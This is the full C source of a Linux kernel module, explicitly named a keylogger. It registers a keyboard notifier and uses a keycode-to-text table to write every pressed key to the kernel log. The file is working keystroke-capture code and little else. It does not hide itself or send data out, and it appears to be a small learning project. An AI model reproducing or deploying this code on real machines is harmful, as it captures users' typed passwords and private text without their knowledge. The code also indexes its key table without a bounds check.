#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/keyboard.h>
#include <linux/notifier.h>

#define KEY_PRESSED 1
#define KEY_NOT_PRESSED 0

MODULE_AUTHOR("Reilly Moore, Brandon Cryderman");
MODULE_LICENSE("GPL");

//Based on this table
//http://www.comptechdoc.org/os/linux/howlinuxworks/linux_hlkeycodes.html
//Not really sure what these values are based on
static const char* keys[] = { "\0", "ESC", "1", "2", "3", "4", "5", "6", "7", "8", "9", "0", "-", "=", "_BACKSPACE_", "_TAB_",
                        "q", "w", "e", "r", "t", "y", "u", "i", "o", "p", "[", "]", "_ENTER_", "_CTRL_", "a", "s", "d", "f",
                        "g", "h", "j", "k", "l", ";", "'", "`", "_SHIFT_", "\\", "z", "x", "c", "v", "b", "n", "m", ",", ".",
                        "/", "_SHIFT_", "\0", "\0", " ", "_CAPSLOCK_", "_F1_", "_F2_", "_F3_", "_F4_", "_F5_", "_F6_", "_F7_",
                        "_F8_", "_F9_", "_F10_", "_NUMLOCK_", "_SCROLLLOCK_", "_HOME_", "_UP_", "_PGUP_", "-", "_LEFT_", "5",
                        "_RTARROW_", "+", "_END_", "_DOWN_", "_PGDN_", "_INS_", "_DEL_", "\0", "\0", "\0", "_F11_", "_F12_",
                        "\0", "\0", "\0", "\0", "\0", "\0", "\0", "_ENTER_", "CTRL_", "/", "_PRTSCR_", "ALT", "\0", "_HOME_",
                        "_UP_", "_PGUP_", "_LEFT_", "_RIGHT_", "_END_", "_DOWN_", "_PGDN_", "_INSERT_", "_DEL_", "\0", "\0",
                        "\0", "\0", "\0", "\0", "\0", "_PAUSE_"};

/*
	keyboard_notifier_callback
	must be of the type notifier_fn_t(notifier_block *nb,
									  unsigned long action, void *data)
*/
int keyboard_notifier_callback(struct notifier_block *nb, unsigned long action, void *data){
	struct keyboard_notifier_param *kb = data;

	/*
		http://lxr.free-electrons.com/source/include/linux/notifier.h#L206
		for action == KBD_KEYCODE
	*/
	if(action == KBD_KEYCODE && kb->down == KEY_PRESSED) {
		printk(KERN_DEBUG "Key pressed: %s\n", keys[kb->value]);
	}

	return 0;
} 

static struct notifier_block nb;

static int __init init_keylogger(void){
	nb.notifier_call = keyboard_notifier_callback;
	register_keyboard_notifier(&nb);

	return 0;
}

static void __exit exit_keylogger(void){
	unregister_keyboard_notifier(&nb);
}

module_init(init_keylogger);
module_exit(exit_keylogger);